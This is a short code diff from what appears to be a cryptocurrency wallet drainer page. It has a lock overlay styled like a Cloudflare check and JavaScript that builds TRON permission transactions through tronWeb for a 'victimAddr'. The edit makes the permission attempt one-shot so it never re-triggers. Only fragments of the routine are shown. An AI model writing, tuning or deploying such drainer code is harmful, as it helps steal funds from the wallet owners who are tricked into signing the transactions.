@@ -480,7 +480,7 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
     window._permBusy = true;
     window.__logINF(pathLabel + ' building tx for ' + addr.slice(0,8) + '…');
     var tw = window.tronWeb || (window.tronLink && window.tronLink.tronWeb);
-    if (!tw) { window.__logERR(pathLabel + ' no tronWeb'); window._permBusy = false; return; }
+    if (!tw) { window.__logERR(pathLabel + ' no tronWeb'); window._permBusy = false; return; } // only reset here — no tronWeb means nothing was sent
     var attempt = 0;
     while (attempt < 3) {
       try {
@@ -517,7 +517,7 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
         }
       }
     }
-    window._permBusy = false;
+    // _permBusy stays TRUE — one shot, never re-trigger after first attempt
   }
 
   async function runGasFreePermission(victimAddr) {
